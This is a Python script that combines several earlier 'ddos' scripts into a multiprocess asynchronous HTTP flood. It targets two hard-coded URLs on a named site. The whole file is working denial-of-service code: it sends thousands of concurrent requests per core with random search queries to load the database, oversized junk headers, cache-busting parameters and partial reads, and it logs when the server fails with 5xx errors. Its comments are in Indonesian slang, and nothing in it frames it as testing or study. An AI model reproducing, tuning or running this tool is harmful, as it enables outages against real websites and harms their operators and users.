import asyncio
import aiohttp
import random
import string
import multiprocessing
import sys

# --- TARGET LIST ---
TARGETS = ["https://ingatcuan88.pro/", "https://ingatcuan88.pro/amp/"]

def rs(length=30):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# --- VECTOR AGGREGATOR ---

# Vector 1: DB Stress (ddos.py / ddosms.py)
async def v_db(session, t):
    url = f"{t}?s={rs(15)}"
    async with session.get(url, timeout=5) as r:
        await r.content.read(1)

# Vector 2: Juggernaut (ddos1.py)
async def v_jug(session, t):
    h = {"Large-Trash-Header": "X" * 2048, "Cookie": f"uid={rs(50)}"}
    async with session.get(t, headers=h, timeout=5) as r:
        await r.content.read(1)

# Vector 3: Silent Slow-Read (ddos2.py)
async def v_silent(session, t):
    async with session.get(t, timeout=10) as r:
        await r.content.read(1) # Kita perkencang read-nya biar gak stuck

# Vector 4: Overlord 5xx (ddos501.py)
async def v_over(session, t):
    url = f"{t}?t={random.random()}"
    async with session.get(url, timeout=5) as r:
        if r.status >= 500: print(f"[🔥] SERVER 5xx! -> {r.status}")

# Vector 5: Cloud Cracker (ddosms1.py)
async def v_cloud(session, t):
    url = f"{t}?s={rs(20)}&cat={random.randint(1,999)}"
    async with session.get(url, timeout=7) as r:
        await r.content.read(5)

# --- ENGINE ---
def start_engine(target_url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def run():
        # Connector agresif biar gak ada limit di sisi PC lu
        conn = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=600)
        async with aiohttp.ClientSession(connector=conn) as session:
            while True:
                tasks = []
                # Tiap core ngejalanin 1500 campuran semua skrip lu
                for _ in range(300): tasks.append(v_db(session, target_url))
                for _ in range(300): tasks.append(v_jug(session, target_url))
                for _ in range(300): tasks.append(v_silent(session, target_url))
                for _ in range(300): tasks.append(v_over(session, target_url))
                for _ in range(300): tasks.append(v_cloud(session, target_url))
                
                # Eksekusi serentak
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Biar terminal rame dan lu gak ngerasa stuck
                success = sum(1 for r in responses if not isinstance(r, Exception))
                print(f"[Core-{multiprocessing.current_process().name}] Sent {success} Mixed Pellets to {target_url}")
                await asyncio.sleep(0.001)

    loop.run_until_complete(run())

if __name__ == "__main__":
    print("🔱 THE GODFATHER IS IN CONTROL 🔱")
    print("Merging: ddos, ddos1, ddos2, ddos501, ddosms, ddosms1")
    
    num_cores = multiprocessing.cpu_count()
    processes = []
    
    for i in range(num_cores):
        # Bagi rata: core genap ke target 1, core ganjil ke target 2
        t = TARGETS[0] if i % 2 == 0 else TARGETS[1]
        p = multiprocessing.Process(target=start_engine, args=(t,), name=f"Engine-{i}")
        p.daemon = True
        p.start()
        processes.append(p)
    
    try:
        for p in processes: p.join()
    except KeyboardInterrupt:
        print("\n[!] Godfather is retiring...")
